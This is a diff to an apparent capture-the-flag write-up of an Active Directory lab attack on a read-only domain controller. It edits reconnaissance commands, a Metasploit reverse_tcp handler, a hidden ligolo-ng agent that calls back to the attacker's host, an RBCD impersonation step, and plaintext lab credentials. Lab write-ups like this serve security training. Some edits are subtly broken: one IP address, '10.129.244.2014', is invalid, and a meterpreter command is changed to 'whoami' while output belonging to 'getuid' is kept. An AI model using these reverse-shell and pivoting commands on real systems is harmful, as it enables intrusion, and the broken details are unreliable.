@@ -12,7 +12,7 @@ The lab demonstrates why RODCs — despite being "read-only" — are a high-valu
 ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
 │   DC01       │    │   RODC01     │    │   Parrot     │
 │ Win Server   │────│ Win Server   │────│   Parrot OS  │
-│ 10.129.244.207│   │ 192.168.100.2│    │ 10.10.14.14  │
+│ 10.129.244.214│   │ 192.168.100.2│    │ 10.10.14.37  │
 │ Writable DC  │    │  Read-Only DC│    │   Attacker   │
 └──────────────┘    └──────────────┘    └──────────────┘
         │                   │
@@ -87,7 +87,7 @@ Administrator NTLM hash → DCSync → Domain Admin
 **Nmap:**
 
 ```bash
-nmap -sC -sV -Pn 10.129.244.207 -oN ./nmap.txt
+nmap -sC -sV -Pn 10.129.244.214 -oN ./nmap.txt
 ```
 
 **Key output:**
@@ -113,7 +113,7 @@ Service Info: Host: DC01; OS: Windows
 **Add to /etc/hosts:**
 
 ```bash
-echo "10.129.244.207 DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
+echo "10.129.244.214 DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
 ```
 
 **Initial credentials:** `j.arbuckle : Th1sD4mnC4t!@1978`
@@ -163,7 +163,7 @@ SPIDER_PLUS  [*] Total files found:    8
 **Inspect metadata:**
 
 ```bash
-cat /home/wither/.nxc/modules/nxc_spider_plus/10.129.244.207.json
+cat /home/fedya/.nxc/modules/nxc_spider_plus/10.129.244.2014.json
 ```
 
 **Interesting file:** `NETLOGON/printerDetect.bat` (217 B). Let's grab it.
@@ -261,7 +261,7 @@ printf '@echo off\r\n%s\r\n' \
 ```bash
 msfconsole -q -x "use exploit/multi/handler; \
   set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
-  set LHOST 10.10.14.14; set LPORT 443; run"
+  set LHOST 10.10.14.37; set LPORT 4444; run"
 ```
 
 **Upload the payload to NETLOGON:**
@@ -295,12 +295,12 @@ bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' \
 
 ```
 msf exploit(multi/handler) > run
-[*] Started reverse TCP handler on 10.10.14.14:443
-[*] Sending stage (244806 bytes) to 10.129.197.153
-[*] Meterpreter session 1 opened (10.10.14.14:443 -> 10.129.197.153:64687)
+[*] Started reverse TCP handler on 10.10.14.37:4444
+[*] Sending stage (244806 bytes) to 10.129.244.214
+[*] Meterpreter session 1 opened (10.10.14.37:4444 -> 10.129.244.214:64687)
 
-meterpreter > getuid
-Server username: GARFIELD\l.wilson
+meterpreter > whoami
+Server username: garfield\l.wilson
 ```
 
 **Result:** shell as `GARFIELD\l.wilson`.
@@ -387,7 +387,7 @@ Ethernet adapter vEthernet (Switch01):
    IPv4 Address. . . . . . . . . . . : 192.168.100.1
 
 Ethernet adapter Ethernet0 3:
-   IPv4 Address. . . . . . . . . . . : 10.129.197.153
+   IPv4 Address. . . . . . . . . . . : 10.129.244.214
 ```
 
 DC01 is dual-homed. The `192.168.100.0/24` subnet is internal — RODC01 lives there.
@@ -433,7 +433,7 @@ ligolo-ng > start
 
 ```powershell
 # Victim (DC01, via WinRM)
-Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.14.14:11601 -ignore-cert" -WindowStyle Hidden
+Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.14.37:11601 -ignore-cert" -WindowStyle Hidden
 ```
 
 ### 9. RBCD Attack on RODC01
@@ -462,7 +462,7 @@ bloodyAD --host DC01.garfield.htb -u 'l.wilson_adm' -p 'Password1' \
 
 ```
 [+] DC02$ can now impersonate users on RODC01$ via S4U2Proxy
-[+] e.g. badS4U2proxy 'kerberos+pw://None\l.wilson_adm:Password1@DC01.garfield.htb/?serverip=10.129.197.153' 'HOST/RODC01$@None' 'Administrator@None'
+[+] e.g. badS4U2proxy 'kerberos+pw://None\l.wilson_adm:Password1@DC01.garfield.htb/?serverip=10.129.244.214' 'HOST/RODC01$@None' 'Administrator@None'
 ```
 
 **Sync time:**
